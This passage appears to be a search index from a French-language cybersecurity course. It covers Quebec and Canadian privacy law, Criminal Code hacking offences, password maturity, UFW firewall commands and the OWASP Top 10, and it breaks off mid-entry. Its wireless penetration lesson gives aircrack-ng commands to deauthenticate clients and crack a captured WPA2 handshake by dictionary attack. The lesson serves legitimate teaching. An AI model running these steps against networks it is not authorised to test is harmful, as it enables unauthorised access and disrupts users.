d\u00e9signer un responsable de la protection des informations personnelle.  Si telle personne n'est pas d\u00e9sign\u00e9e, c'est le plus haut dirigeant qui prend le r\u00f4le par d\u00e9faut.  </p> <p>Que doit-on faire pour prot\u00e9ger les renseignements personnels (sensibles ou non) ?  </p> <ul> <li>Les renseignements personnels doivent n'\u00eatre accessibles qu'aux personnes autoris\u00e9es.  </li> <li>Aucun renseignement personnel ne doit \u00eatre transmis via un moyen non s\u00e9curis\u00e9. (Par exemple par courrier \u00e9lectronique ou par FTP).  Utiliser le chiffrement s'il vous faut utiliser le courrier \u00e9lectronique.  </li> </ul> <p>Quels sont les autres devoirs des entreprises ?  </p> <ul> <li>les entreprises doivent d\u00e9truire les renseignements personnels lorsque les fins auxquelles ils ont \u00e9t\u00e9 recueillis ou utilis\u00e9s sont accomplies.  </li> <li>les entreprises doivent divulguer \u00e0 la Commission d'acc\u00e8s \u00e0 l'information la cr\u00e9ation d'une banque de renseignements biom\u00e9triques au moins 60 jours avant sa mise en place.  </li> <li>Sauf exception, un renseignement personnel ne pourra \u00eatre utilis\u00e9 \u00e0 une autre fin par une organisation, \u00e0 moins que la personne concern\u00e9e n\u2019y consente.  </li> <li>Les personnes pourront demander aux entreprises de cesser de diffuser leurs renseignements personnels ou de d\u00e9sindexer tout hyperlien rattach\u00e9 \u00e0 leur nom donnant acc\u00e8s \u00e0 des renseignements si cette diffusion leur cause pr\u00e9judice ou contrevient \u00e0 la loi ou \u00e0 une ordonnance judiciaire (droit \u00e0 l\u2019effacement ou \u00e0 l\u2019oubli).  </li> <li>Les organisations devront aviser la Commission et les personnes concern\u00e9es de tout incident de confidentialit\u00e9 impliquant un renseignement personnel qu\u2019elles d\u00e9tiennent et pr\u00e9sentant un risque de pr\u00e9judice s\u00e9rieux.</li> <li> <p>les organisations recueillant des renseignements personnels aupr\u00e8s de la personne concern\u00e9e en ayant recours \u00e0 une technologie comprenant des fonctions permettant de l\u2019identifier, de la localiser ou d\u2019effectuer un profilage de celle-ci devront au pr\u00e9alable l\u2019informer :</p> </li> <li> <p>Du recours \u00e0 une telle technologie ;</p> </li> <li>Des moyens offerts pour activer les fonctions permettant d\u2019identifier, de localiser ou d\u2019effectuer un profilage. En d\u2019autres mots, ces technologies ne pourront \u00eatre activ\u00e9es par d\u00e9faut; ce sera \u00e0 la personne concern\u00e9e de les activer si elle le souhaite.</li> </ul>"},{"location":"lecons/Lois/#section-de-la-loi-sur-les-temoins-cookies","title":"Section de la loi sur les t\u00e9moins (cookies)","text":"<p>La loi 25 pr\u00e9voit que les organisations devront obtenir le consentement de la personne concern\u00e9e avant de recueillir, d\u2019utiliser ou de communiquer des renseignements personnels \u00e0 l\u2019aide de t\u00e9moins (cookies) ou de technologies similaires.</p> <p>Les organisations devront \u00e9galement informer les personnes concern\u00e9es de la finalit\u00e9 de l\u2019utilisation de ces technologies et des moyens offerts pour les d\u00e9sactiver.</p> <p></p> <p>Pour plus de d\u00e9tails </p>"},{"location":"lecons/Lois/#pipeda-pour-le-reste-du-canada","title":"PIPEDA pour le reste du Canada","text":"<p>En fran\u00e7ais : La Loi sur la protection des renseignements personnels et les documents \u00e9lectroniques (LPRPDE)</p> <p>Pour en savoir plus</p> <p>Les organisations assujetties \u00e0 des lois provinciales essentiellement similaires en mati\u00e8re de protection des renseignements personnels sont habituellement exon\u00e9r\u00e9es de la LPRPDE en ce qui a trait \u00e0 la collecte, \u00e0 l\u2019utilisation ou \u00e0 la communication de renseignements personnels au sein de cette province.</p> <ul> <li>Toutes les entreprises qui exercent des activit\u00e9s au Canada</li> <li>Les organisations sous r\u00e9glementation f\u00e9d\u00e9rale qui exercent leurs activit\u00e9s au Canada sont toujours assujetties \u00e0 la LPRPDE.</li> </ul> <p>Ex :  </p> <ul> <li>Les banques  </li> <li>Les a\u00e9roports  </li> <li>Les radiodiffuseurs  </li> </ul> <p>La LPRPDE prot\u00e8ge essentiellement de la m\u00eame mani\u00e8re que la loi 25 du Qu\u00e9bec.  </p>"},{"location":"lecons/Lois/#code-criminel","title":"Code criminel","text":"<p>Le piratage est consid\u00e9r\u00e9 criminel au sens de la loi.  </p> <p>D'apr\u00e8s le code criminel du Canada (R.S.C 1985 c. C-46) :  </p>"},{"location":"lecons/Lois/#interception-des-communications","title":"Interception des communications","text":"<p>184 (1) Quiconque, au moyen d\u2019un dispositif \u00e9lectromagn\u00e9tique, acoustique, m\u00e9canique ou autre, intercepte sciemment une communication priv\u00e9e est coupable :  </p> <p>a) soit d\u2019un acte criminel passible d\u2019un emprisonnement maximal de cinq ans;  </p> <p>b) soit d\u2019une infraction punissable sur d\u00e9claration de culpabilit\u00e9 par proc\u00e9dure sommaire.  </p>"},{"location":"lecons/Lois/#utilisation-non-autorisee-dordinateur","title":"Utilisation non autoris\u00e9e d\u2019ordinateur","text":"<p>342.1 (1) Est coupable d\u2019un acte criminel et passible d\u2019un emprisonnement maximal de dix ans ou d\u2019une infraction punissable sur d\u00e9claration de culpabilit\u00e9 par proc\u00e9dure sommaire, quiconque, frauduleusement et sans apparence de droit\u2009:  </p> <p>a) directement ou indirectement, obtient des services d\u2019ordinateur;  </p> <p>b) au moyen d\u2019un dispositif \u00e9lectromagn\u00e9tique, acoustique, m\u00e9canique ou autre, directement ou indirectement, intercepte ou fait intercepter toute fonction d\u2019un ordinateur;  </p> <p>c) directement ou indirectement, utilise ou fait utiliser un ordinateur dans l\u2019intention de commettre une infraction pr\u00e9vue aux alin\u00e9as a) ou b) ou \u00e0 l\u2019article 430 concernant des donn\u00e9es informatiques ou un ordinateur;  </p> <p>d) a en sa possession ou utilise un mot de passe d\u2019ordinateur qui permettrait la perp\u00e9tration des infractions pr\u00e9vues aux alin\u00e9as a), b) ou c), ou en fait le trafic ou permet \u00e0 une autre personne de l\u2019utiliser.  </p> <p>Pour en savoir plus </p>"},{"location":"lecons/Lois/#fraude","title":"Fraude","text":"<p>380 (1) Quiconque, par supercherie, mensonge ou autre moyen dolosif, constituant ou non un faux semblant au sens de la pr\u00e9sente loi, frustre le public ou toute personne, d\u00e9termin\u00e9e ou non, de quelque bien, service, argent ou valeur :  </p> <p>a) est coupable d\u2019un acte criminel et passible d\u2019un emprisonnement maximal de quatorze ans, si l\u2019objet de l\u2019infraction est un titre testamentaire ou si la valeur de l\u2019objet de l\u2019infraction d\u00e9passe cinq mille dollars;  </p> <p>b) est coupable :  </p> <p>(i) soit d\u2019un acte criminel et passible d\u2019un emprisonnement maximal de deux ans,  </p> <p>(ii) soit d\u2019une infraction punissable sur d\u00e9claration de culpabilit\u00e9 par proc\u00e9dure sommaire,  </p> <p>si la valeur de l\u2019objet de l\u2019infraction ne d\u00e9passe pas cinq mille dollars.  </p>"},{"location":"lecons/Lois/#mefait-a-legard-de-donnees-informatiques","title":"M\u00e9fait \u00e0 l\u2019\u00e9gard de donn\u00e9es informatiques","text":"<p>(1.1) Commet un m\u00e9fait quiconque volontairement, selon le cas\u2009:  </p> <p>a) d\u00e9truit ou modifie des donn\u00e9es informatiques;  </p> <p>b) d\u00e9pouille des donn\u00e9es informatiques de leur sens, les rend inutiles ou inop\u00e9rantes;  </p> <p>c) emp\u00eache, interrompt ou g\u00eane l\u2019emploi l\u00e9gitime des donn\u00e9es informatiques;  </p> <p>d) emp\u00eache, interrompt ou g\u00eane une personne dans l\u2019emploi l\u00e9gitime des donn\u00e9es informatiques ou refuse l\u2019acc\u00e8s aux donn\u00e9es informatiques \u00e0 une personne qui y a droit.  </p> <p>Peine  </p> <p>(2) Est coupable d\u2019un acte criminel et passible de l\u2019emprisonnement \u00e0 perp\u00e9tuit\u00e9 quiconque commet un m\u00e9fait qui cause un danger r\u00e9el pour la vie des gens.  </p> <p>Idem  </p> <p>(3) Quiconque commet un m\u00e9fait \u00e0 l\u2019\u00e9gard d\u2019un bien qui constitue un titre testamentaire ou dont la valeur d\u00e9passe cinq mille dollars est coupable :  </p> <p>a) soit d\u2019un acte criminel et passible d\u2019un emprisonnement maximal de dix ans;  </p> <p>b) soit d\u2019une infraction punissable sur d\u00e9claration de culpabilit\u00e9 par proc\u00e9dure sommaire.  </p> <p>Idem  </p> <p>(4) Quiconque commet un m\u00e9fait \u00e0 l\u2019\u00e9gard d\u2019un bien, autre qu\u2019un bien vis\u00e9 au paragraphe (3), est coupable :  </p> <p>a) soit d\u2019un acte criminel et passible d\u2019un emprisonnement maximal de deux ans;  </p> <p>b) soit d\u2019une infraction punissable sur d\u00e9claration de culpabilit\u00e9 par proc\u00e9dure sommaire.  </p>"},{"location":"lecons/Lois/#lois-101-et-96-au-quebec","title":"Lois 101 et 96 au Qu\u00e9bec","text":"<p>La charte de la langue fran\u00e7aise au Qu\u00e9bec est un ensemble de r\u00e8gles prot\u00e9geant le Fran\u00e7ais au Qu\u00e9bec. Toute entreprise ayant au moins 25 employ\u00e9s r\u00e9sidents au Qu\u00e9bec doit respecter cette charte.  </p> <p>Quels sont les droits des employ\u00e9s ?  </p> <ul> <li>Pouvoir travailler en fran\u00e7ais.  </li> <li>Leurs outils de travail doivent \u00eatre adapt\u00e9s \u00e0 la langue fran\u00e7aise.  </li> <li>\u00c7a inclut les ordinateurs et tous les logiciels qui sont utilis\u00e9s pour effectuer des t\u00e2ches.  </li> <li>Tout document doit \u00eatre en fran\u00e7ais.  </li> <li>Toutes les formations doivent \u00eatre en fran\u00e7ais.  </li> </ul> <p>Quels sont les devoirs des entreprises ?  </p> <ul> <li>Ne pas obliger les employ\u00e9s de conna\u00eetre une autre langue que le fran\u00e7ais.  </li> <li>Offrir tout produit ou service en fran\u00e7ais.  </li> <li>Les communications avec les clients qu\u00e9b\u00e9cois doivent \u00eatre en fran\u00e7ais par d\u00e9faut et par la suite le client peut choisir de changer la langue.  </li> </ul>"},{"location":"lecons/Lois/#loi-canadienne-anti-pourriel","title":"Loi canadienne anti-pourriel","text":"<p>Qu'est-ce qu'un pourriel?  </p> <ul> <li>Un courriel non sollicit\u00e9.  </li> </ul> <p>Qu'est-ce qu'un pourriel au sens de la loi?  </p> <p>Selon la LCAP : \" La d\u00e9finition la plus simple du pourriel est le courriel non sollicit\u00e9, bien qu'il puisse aussi comprendre les messages texte et les logiciels non sollicit\u00e9s.</p> <p>La d\u00e9finition juridique de pourriel comprend \u00e9galement :</p> <ul> <li>la modification non autoris\u00e9e de donn\u00e9es de transmission;  </li> <li>l'installation de programmes informatiques sans consentement;  </li> <li>les repr\u00e9sentations \u00e9lectroniques fausses ou trompeuses (y compris les sites Web);  </li> <li>l'enregistrement d'adresses (collecte ou utilisation d'adresses de courriel ou d'autres adresses \u00e9lectroniques sans permission);  </li> <li>la collecte de renseignements personnels en acc\u00e9dant ill\u00e9galement \u00e0 un syst\u00e8me informatique ou \u00e0 un appareil \u00e9lectronique. \"</li> </ul> <p>La LCAP exige que tout envoi de courriel commercial soit consenti par le destinataire.  </p> <p>Les messages doivent contenir :  </p> <ul> <li>Le nom commercial de l'entreprise;  </li> <li>Une adresse postale actuelle et un num\u00e9ro de t\u00e9l\u00e9phone;  </li> <li>une adresse \u00e9lectronique ou une adresse de site Web;  </li> <li>Des coordonn\u00e9es exactes qui seront valides pendant au moins 60 jours apr\u00e8s l\u2019envoi du message;  </li> <li>Un m\u00e9canisme de d\u00e9sabonnement conforme;  </li> </ul> <p>De plus, n\u2019oubliez pas que chaque demande de d\u00e9sabonnement doit \u00eatre trait\u00e9e dans les 10 jours ouvrables ou moins et sans frais pour le destinataire.  </p> <p>Pour plus de d\u00e9tails </p>"},{"location":"lecons/Lois/#facturation-obligatoire-dans-le-secteur-de-la-restauration","title":"Facturation obligatoire dans le secteur de la restauration","text":"<p>Certaines lois ont des impacts sur la mise en place de syst\u00e8mes informatiques. Exemple int\u00e9ressant, la loi sur la facturation obligatoire dans le secteur de la restauration, qui requiert l'utilisation d'un module d'enregistrement des ventes (MEV). Ce module cr\u00e9\u00e9 un code QR sur chaque facture qui en revanche pointe sur un site gouvernemental.</p> <p>Voici un exemple de facture respectant la loi :  </p> <p> </p> <p>Voici la page point\u00e9e par le code QR :  </p> <p></p> <p>Site MEV pour la facture </p>"},{"location":"lecons/Lois/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la loi </p>"},{"location":"lecons/Mots_de_passe/","title":"Mots de passe","text":""},{"location":"lecons/Mots_de_passe/#niveaux-de-maturite-dans-la-gestion-des-mots-de-passe","title":"Niveaux de maturit\u00e9 dans la gestion des mots de passe","text":"<p>CASMM</p> <p> The Consumer Authentication Strength Maturity Model    </p>"},{"location":"lecons/Mots_de_passe/#niveau-1-mots-de-passe-partages","title":"Niveau 1 - Mots de passe partag\u00e9s","text":"<p>Vous utilisez le m\u00eame mot de passe sur plusieurs sites.  </p>"},{"location":"lecons/Mots_de_passe/#niveau-2-mots-de-passe-uniques","title":"Niveau 2 - Mots de passe uniques","text":"<p>Vous utilisez des mots de passe uniques, mais souvent trop faciles \u00e0 deviner ou contenant des informations personnelles. (Ex: le nom de mon chien)  </p>"},{"location":"lecons/Mots_de_passe/#niveau-3-mots-de-passe-de-qualite","title":"Niveau 3 - Mots de passe de qualit\u00e9","text":"<p>En plus d'\u00eatre uniques, vos mots de passe sont difficiles \u00e0 deviner.  </p>"},{"location":"lecons/Mots_de_passe/#niveau-4-gestionnaire-de-mots-de-passe","title":"Niveau 4 - Gestionnaire de mots de passe","text":"<p>Vous g\u00e9rez vos mots de passe dans un outil de gestion prot\u00e9g\u00e9 par la cryptographie.  </p>"},{"location":"lecons/Mots_de_passe/#niveau-5-codes-multifacteurs-par-sms","title":"Niveau 5 - Codes multifacteurs par SMS","text":"<p>En plus du gestionnaire de mots de passe, vos comptes sont prot\u00e9g\u00e9s par des codes temporaires \u00e0 usage unique envoy\u00e9s par SMS.  </p>"},{"location":"lecons/Mots_de_passe/#niveau-6-codes-multifacteurs-par-application","title":"Niveau 6 - Codes multifacteurs par application","text":"<p>En plus du gestionnaire de mots de passe, vos comptes sont prot\u00e9g\u00e9s par des codes temporaires \u00e0 usage unique g\u00e9n\u00e9r\u00e9s dans une application.  </p>"},{"location":"lecons/Mots_de_passe/#niveau-7-multifacteur-sans-code-par-application","title":"Niveau 7 - Multifacteur sans code par application","text":"<p>Au lieu d'un code g\u00e9n\u00e9r\u00e9 par une application, vous recevez une notification dans une application qui vous demande d'accepter ou de refuser l'acc\u00e8s.  </p>"},{"location":"lecons/Mots_de_passe/#niveau-8-sans-mot-de-passe","title":"Niveau 8 - Sans mot de passe","text":"<p>Votre acc\u00e8s multifacteur est g\u00e9r\u00e9 par un jeton physique.  </p>"},{"location":"lecons/Mots_de_passe/#hygiene-de-la-gestion-des-mots-de-passe","title":"Hygi\u00e8ne de la gestion des mots de passe","text":"<p>Hygi\u00e8ne de la gestion des mots de passe</p> <p> Vu dans une universit\u00e9  </p>"},{"location":"lecons/Mots_de_passe/#lectures-supplementaires","title":"Lectures suppl\u00e9mentaires","text":"<p>CASMM </p>"},{"location":"lecons/Pare_feu/","title":"Les pare-feux","text":"<p>D\u00e9finition de wikipedia :</p> <p>Un pare-feu est un logiciel et/ou un mat\u00e9riel permettant de faire respecter la politique de s\u00e9curit\u00e9 du r\u00e9seau, celle-ci d\u00e9finissant quels sont les types de communications autoris\u00e9s sur ce r\u00e9seau informatique. Il surveille et contr\u00f4le les applications et les flux de donn\u00e9es (paquets).</p> <p>Types de pare-feux :  </p> <ul> <li>Pare-feu sans \u00e9tat (stateless firewall)</li> <li>Pare-feu \u00e0 \u00e9tats (stateful firewall)</li> <li>Pare-feu applicatif</li> <li>Pare-feu personnel</li> </ul> <p></p> <p>Un pare-feu est typiquement utilis\u00e9 entre des zones r\u00e9seaux de diff\u00e9rentes natures. (ex: Internet vs r\u00e9seau interne)</p>"},{"location":"lecons/Pare_feu/#pare-feu-sans-etat","title":"Pare-feu sans \u00e9tat","text":"<p>Un pare-feu tr\u00e8s simpliste. Il agit sur chaque paquet ind\u00e9pendamment, sans tenir compte du protocole. Se configure avec des r\u00e8gles ou des filtres.</p> <p>Ex:</p> <p>Source : 10.0.0.0/24  Port : Tous</p> <p>Destination : 192.168.0.1 Port : 80</p> <p>R\u00e8gle : Permettre (allow)</p>"},{"location":"lecons/Pare_feu/#pare-feu-avec-etat","title":"Pare-feu avec \u00e9tat","text":"<p>Un pare-feu avec une certaine capacit\u00e9 \u00e0 se souvenir. En effet, les pare-feux avec \u00e9tat conservent en m\u00e9moire les conversations TCP qui sont \u00e9tablies entre deux h\u00f4tes pour mieux contr\u00f4ler le trafic entre les segments de r\u00e9seau.</p>"},{"location":"lecons/Pare_feu/#pare-feu-applicatif","title":"Pare-feu applicatif","text":"<p>Un pare-feu avec une bonne connaissance de certains protocoles, permettant des r\u00e8gles de filtres \u00e9volu\u00e9es pour restreindre ce qui peut passer, selon l'utilisation du protocole utilis\u00e9. Par exemple, la commande GET de HTTP pourrait \u00eatre permise, mais pas la commande PUT.</p>"},{"location":"lecons/Pare_feu/#pare-feu-personnel","title":"Pare-feu personnel","text":"<p>Un type de pare-feu avec \u00e9tat qui est install\u00e9 sur les postes de travail.</p>"},{"location":"lecons/Pare_feu/#pare-feu-materiel","title":"Pare-feu mat\u00e9riel","text":"<p>Grands manufacturiers de pare-feux :</p> <ul> <li>Cisco   </li> <li>Juniper  </li> <li>Fortinet  </li> <li>CheckPoint  </li> <li>SonicWall  </li> </ul> <p>Appareils sp\u00e9cialis\u00e9s qui n'ont qu'une fonction, prot\u00e9ger le r\u00e9seau interne d'une compagnie.</p>"},{"location":"lecons/Pare_feu/#pare-feu-logiciel","title":"Pare-feu logiciel","text":""},{"location":"lecons/Pare_feu/#windows","title":"Windows","text":"<p>Le pare-feu de Microsoft Windows est un pare-feu personnel.</p> <p></p> <p>Le pare-feu de Windows peut filtrer selon :</p> <ul> <li>Le port</li> <li>L'application</li> </ul> <p>Pour cr\u00e9er un r\u00e8gle qui emp\u00eache le trafic sur 443 :</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"lecons/Pare_feu/#linux","title":"Linux","text":"<p>Voici quelques pare-feux disponibles pour Linux :</p> <ul> <li>IPTables  </li> <li>ShoreWall</li> <li>UFW (Uncomplicated FireWall)</li> <li>pfSense</li> <li>Endian</li> </ul> <p>Pour le cours, UFW sera utilis\u00e9.</p> <p>Pour l'installation :</p> <p><code>sudo apt-get install ufw</code></p> <p>Pour v\u00e9rifier le status du pare-feu :</p> <p><code>sudo ufw status</code></p> <p>Pour activer le pare-feu :</p> <p><code>sudo ufw enable</code></p> <p>Pour d\u00e9sactiver le pare-feu :</p> <p><code>sudo ufw disable</code></p> <p>Pour permettre un protocole sp\u00e9cifique (ex: ssh) :</p> <p><code>sudo ufw allow ssh</code></p> <p>(\u00c7a permet ssh sur tcp et udp) Pour tcp seulement :</p> <p><code>sudo ufw allow ssh/tcp</code></p> <p>Pour voir la liste des services que connait UFW :</p> <p><code>less /etc/services</code></p> <p>Pour restreindre un protocole sp\u00e9cifique (ex: ftp) :</p> <p><code>sudo ufw deny ftp</code></p> <p>Pour effacer une r\u00e8gle :</p> <p><code>sudo ufw delete deny ftp</code></p> <p>Pour permettre un port sp\u00e9cifique (ex: 8080) :</p> <p><code>sudo ufw allow 8080</code></p> <p>Pour permettre un actif sp\u00e9cifique de se connecter \u00e0 n'importe quel port :</p> <p><code>sudo ufw allow from 192.168.2.10</code></p> <p>En combinant, on peut faire une r\u00e8gle plus sp\u00e9cifique :</p> <p><code>sudo ufw allow from 192.168.2.10 to any port ssh</code></p> <p>Pour voir la liste des r\u00e8gles num\u00e9rot\u00e9es :</p> <p><code>sudo ufw status numbered</code></p> <p>Pour effecer une r\u00e8gle par son num\u00e9ro :</p> <p><code>sudo ufw delete 3</code></p> <p>Pour r\u00e9initialiser le pare-feu :</p> <p><code>sudo ufw reset</code></p> <p>M\u00e9thode pour configurer un pare-feu :</p> <ol> <li>Assurez-vous que la r\u00e8gle par d\u00e9faut est de restreindre (deny)</li> <li>N'ouvrez que les ports qui sont n\u00e9cessaires, que pour les clients n\u00e9cessaires.</li> </ol> <p>Ex : Pour un serveur Web utilis\u00e9 qu'\u00e0 l'interne de notre sous-r\u00e9seau.</p> <p><code>sudo ufw reset</code></p> <p><code>sudo ufw default deny</code></p> <p><code>sudo ufw allow from 192.168.40.0/24 to any port http</code></p> <p><code>sudo ufw allow from 192.168.40.0/24 to any port https</code></p> <p><code>sudo ufw enable</code></p>"},{"location":"lecons/Pare_feu/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur les pare-feux</p>"},{"location":"lecons/Penetration_reseau_sans_fils/","title":"P\u00e9n\u00e9tration de r\u00e9seau sans-fils","text":""},{"location":"lecons/Penetration_reseau_sans_fils/#nature-du-reseau-sans-fils","title":"Nature du r\u00e9seau sans-fils","text":"<p>Le protocole 802.11 permet la communication entre appareils via les ondes radio. Les ondes radio voyagent librement dans l'air et peuvent \u00eatre \u00e9cout\u00e9es par n'importe quel appareil qui se trouve assez proche pour recevoir l'onde.</p> <p>C'est pourquoi il a fallu avoir des protocoles de chiffrement des paquets d'informations envoy\u00e9es, pour \u00e9liminer l'\u00e9coute illicite.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#protocoles-de-securite","title":"Protocoles de s\u00e9curit\u00e9","text":"<p>Il y a 3 protocoles de chiffrement des communications sans-fils : - WEP : Tr\u00e8s ins\u00e9cure, utilise l'algorithme RC4 - WPA : Utilise TKIP et est bas\u00e9 sur WEP - WPA2 : Utilise AES, jug\u00e9 tr\u00e8s s\u00e9curitaire, m\u00eame aujourd'hui  </p>"},{"location":"lecons/Penetration_reseau_sans_fils/#wpa2-et-lechange-en-4-etapes","title":"WPA2 et l'\u00e9change en 4 \u00e9tapes","text":"<p>WPA2 utilise un \u00e9change entre le point d'acc\u00e8s (access point ou AP) et le client en 4 \u00e9tapes (4-way handshake). L'\u00e9change est pour prouver que AP et le client connaissent tous les deux la cl\u00e9 de chiffrement, sans divulguer la cl\u00e9. Les deux parties chiffrent des messages pour l'autre avec la cl\u00e9 et lorsqu'ils d\u00e9chiffrent le message de l'autre, ils ont la certitude que l'autre poss\u00e8de la cl\u00e9.</p> <p></p> <ol> <li>L'AP envoie une valeur nonce (ANonce) au client. Le client se sert du nonce pour construire sa cl\u00e9.</li> <li>Le client envoie sa propre valeur nonce (SNonce) \u00e0 l'AP et code d'int\u00e9grit\u00e9 de message (MIC - Message Integrity Code) qui inclus l'authentication.</li> <li>L'AP construit et envoi le GTK (Group Temporal Key) ainsi que son MIC.</li> <li>Le client envoi une confirmation \u00e0 l'AP</li> </ol> <p>Tout se passe en texte clair, il est donc possible d'\u00e9couter et de conserver dans un fichier PCAP pour faire un attaque par dictionnaire.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#equipement-requis","title":"\u00c9quipement requis","text":"<p>Pour pouvoir utiliser les outils dans Kali pour une attaque du r\u00e9seau sans-fils, il faut un appareil de connectivit\u00e9 WIFI qui supporte les deux modes suivants : - Monitoring - Injection de paquets (packet injection)</p> <p>Ce ne sont pas toutes les cartes wifi qui supportent ces deux modes.</p> <p>Voici le mod\u00e8le utilis\u00e9 dans ce cours :  </p> <p></p>"},{"location":"lecons/Penetration_reseau_sans_fils/#configurer-lappareil-wifi","title":"Configurer l'appareil WIFI","text":"<p>Dans VirtualBox, changez les param\u00e8tres USB de la VM Kali.  </p> <p> </p> <p>1- Utiliser le contr\u00f4leur USB 3.0 2- Ajouter un filtre USB 3- Choisir Ralink  </p>"},{"location":"lecons/Penetration_reseau_sans_fils/#aircrack-ng","title":"Aircrack-ng","text":"<p>Aircrack-ng est une suite d'outils pour \u00e9couter le r\u00e9seau sans-fils, forcer la r\u00e9authentification et faire une attaque par dictionnaire.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#mettre-sa-carte-en-mode-monitoring","title":"Mettre sa carte en mode monitoring","text":"<p>Arr\u00eater tous les processus qui utilisent la carte wifi :  </p> <p><code>airmon-ng check kill</code></p> <p>Utiliser la commande airmon-ng pour d\u00e9marrer le mode monitoring.</p> <p><code>airmon-ng start wlan0</code></p> <p>Le device s'appellera wlan0mon.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#ecouter-les-ondes","title":"\u00c9couter les ondes","text":"<p>\u00c9couter les ondes pour trouver l'AP \u00e0 p\u00e9n\u00e9trer.</p> <p><code>airodump-ng wlan0mon</code></p> <p>Trouvez votre AP et copiez le BSSID.  Notez aussi le canal (channel) utilis\u00e9 par l'AP.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#ecouter-les-communications-de-lap","title":"\u00c9couter les communications de l'AP","text":"<p>Il faut maintenant \u00e9couter attentivement les communications entre les clients et l'AP cibl\u00e9.</p> <p><code>airodump-ng --bssid AA:AA:AA:AA:AA:AA -c 11 --write prefixe wlan0mon</code> </p> <p>Le monitoring est d\u00e9marr\u00e9. Il faut maintenant attendre qu'il y ait une authentification par un client.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#forcer-une-authentification","title":"Forcer une authentification","text":"<p>Dans une autre fen\u00eatre de terminal, nous allons forcer l'authentification d'un client.</p> <p><code>aireplay-ng -0 0 -a AA:AA:AA:AA:AA:AA wlan0mon</code></p> <p>\u00c7a force tous les clients \u00e0 s'authentifier.</p> <p>Une fois que vous voyez la mention \"WPA Handshake\" dans airodump-ng, vous pouvez arr\u00eater les deux outils.</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#attaque-par-dictionnaire","title":"Attaque par dictionnaire","text":"<p>Il faut maintenant attaquer le handshake avec une liste de mots de passe. Une liste disponible sur Internet de plus de 64 millions de mots de passe se trouve ici :</p> <p>Crackstation</p> <p>Notez qu'utiliser cette liste peut prendre plus de 24 heures pour cracker le mot de passe du Wifi.</p> <p>Pour d\u00e9marrer l'attaque par dictionnaire :  </p> <p><code>aircrack-ng prefixe-01.cap -w mots_de_passe</code> </p> <p>Une fois l'outil termin\u00e9, nous avons la cl\u00e9!</p>"},{"location":"lecons/Penetration_reseau_sans_fils/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la p\u00e9n\u00e9tration de r\u00e9seau sans-fils </p>"},{"location":"lecons/Programmer_application_securisee/","title":"Programmation d'applications s\u00e9curis\u00e9es","text":""},{"location":"lecons/Programmer_application_securisee/#owasp-top-10","title":"OWASP Top 10","text":"Risk Description A1:2017-Injection Une faille de type injection, comme une injection SQL, une injection de commande syst\u00e8me, ou une injection LDAP, se produit quand une donn\u00e9e non fiable est envoy\u00e9e \u00e0 un interpr\u00e9teur en tant qu'\u00e9l\u00e9ment d'une commande ou d'une requ\u00eate. Les donn\u00e9es hostiles de l'attaquant peuvent duper l'interpr\u00e9teur afin de l'amener \u00e0 ex\u00e9cuter des commandes fortuites ou acc\u00e9der \u00e0 des donn\u00e9es non autoris\u00e9es. A2:2017-Authentification de mauvaise qualit\u00e9 Les fonctions applicatives li\u00e9es \u00e0 l'authentification et \u00e0 la gestion des sessions sont souvent mal impl\u00e9ment\u00e9es, ce qui permet aux attaquants de compromettre des mots de passe, des cl\u00e9s ou des jetons de session, ou encore d'exploiter d'autres failles d'impl\u00e9mentation pour usurper temporairement ou d\u00e9finitivement l'identit\u00e9 d'autres utilisateurs. A3:2017-Exposition de donn\u00e9es sensibles Beaucoup d'applications web et d'APIs ne prot\u00e8gent pas correctement les donn\u00e9es sensibles telles que les donn\u00e9es bancaires, les donn\u00e9es relatives aux soins de sant\u00e9, les donn\u00e9es personnelles d'identification. Les pirates peuvent alors voler ou modifier ces donn\u00e9es mal prot\u00e9g\u00e9es pour effectuer une usurpation d'identit\u00e9, une fraude \u00e0 la carte de cr\u00e9dit ou d'autres crimes. Les donn\u00e9es sensibles m\u00e9ritent une protection suppl\u00e9mentaire tel un chiffrement statique ou en transit, ainsi que des pr\u00e9cautions particuli\u00e8res lors de l'\u00e9change avec le navigateur. A4:2017-XML External Entities (XXE) De nombreux processeurs xml, anciens ou mal configur\u00e9s, \u00e9valuent les r\u00e9f\u00e9rences aux entit\u00e9s externes dans les documents XML. Les entit\u00e9s externes peuvent \u00eatre utilis\u00e9es pour divulguer des fichiers internes \u00e0 l'aide du gestionnaire d'URI, pour faire des partages de fichier interne, pour faire de l'analyse interne de ports, pour ex\u00e9cuter du code \u00e0 distance, pour faire des attaques par d\u00e9ni de service. A5:2017-Violation de contr\u00f4le d'acc\u00e8s Les restrictions sur les droits des utilisateurs  authentifi\u00e9s sont souvent mal appliqu\u00e9es. Les attaquants peuvent exploiter ces failles pour acc\u00e9der \u00e0 des fonctionnalit\u00e9s et/ou des donn\u00e9es non autoris\u00e9es. Par exemple, acc\u00e9der aux comptes d'autres utilisateurs, visualiser des fichiers sensibles, modifier les donn\u00e9es d'autres utilisateurs, modifier les droits d'acc\u00e8s, etc. A6:2017-Mauvaise configuration S\u00e9curit\u00e9 La mauvaise configuration de la s\u00e9curit\u00e9 est le probl\u00e8me le plus r\u00e9pandu. C'est g\u00e9n\u00e9ralement le r\u00e9sultat de configurations par d\u00e9faut non s\u00e9curis\u00e9es, de configurations incompl\u00e8tes ou ad hoc, d'un stockage dans un cloud ouvert, d'en-t\u00eates HTTP mal configur\u00e9s et de messages d'erreur verbeux contenant des informations sensibles. Non seulement tous les syst\u00e8mes d'exploitation, frameworks, biblioth\u00e8ques et applications doivent \u00eatre configur\u00e9s de fa\u00e7on s\u00e9curis\u00e9es, mais ils doivent \u00e9galement \u00eatre corrig\u00e9s et mis \u00e0 jour en temps et en heure. A7:2017-Cross-Site Scripting (XSS) Les failles XSS se produisent chaque fois qu'une application inclut des donn\u00e9es non fiables dans une nouvelle page Web sans les valider ou les \u00e9chapper de fa\u00e7on appropri\u00e9e, ou lorsqu'elle met \u00e0 jour 